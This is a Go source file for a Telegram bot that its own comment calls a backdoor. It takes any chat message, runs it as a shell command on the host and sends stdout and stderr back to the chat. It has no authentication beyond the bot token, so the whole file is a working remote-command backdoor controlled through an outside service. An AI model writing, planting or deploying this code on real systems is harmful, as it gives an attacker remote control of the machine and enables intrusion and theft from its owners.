package main

import (
	"flag"
	"fmt"
	"log"
	_exec "os/exec"
	"strings"

	// https://pkg.go.dev/github.com/go-telegram-bot-api/telegram-bot-api/v5
	api "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var _TOKEN_ = flag.String("token", "", "TOKEN for Telegram bot")
var _DEBUG_ = flag.Bool("debug", false, "Debug mode")
var _TIMEOUT_ = flag.Int("timeout", 60, "Timeout for Telegram bot")

// exec executes a command and returns stdout and stderr
// as strings.
func exec(command string) (string, string) {
	cmd := strings.Split(command, " ")
	stdout, stderr := _exec.Command(cmd[0], cmd[1:]...).Output()

	if stderr != nil {
		return string(stdout), stderr.Error()
	}

	return string(stdout), ""
}

// Telegram bot
// Main function for Backdoor
func main() {
	flag.Parse()

	bot, err := api.NewBotAPI(*_TOKEN_)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = *_DEBUG_
	updateConfig := api.NewUpdate(0)
	updateConfig.Timeout = *_TIMEOUT_

	updatesChannel := bot.GetUpdatesChan(updateConfig)

	for update := range updatesChannel {
		if update.Message != nil {
			var reply api.MessageConfig
			stdout, stderr := exec(update.Message.Text)

			reply = api.NewMessage(update.Message.Chat.ID, fmt.Sprintf("[stdout]\n%s\n[stderr]\n%s", stdout, stderr))
			reply.ReplyToMessageID = update.Message.MessageID
			reply.DisableWebPagePreview = true

			bot.Send(reply)
		}
	}
}
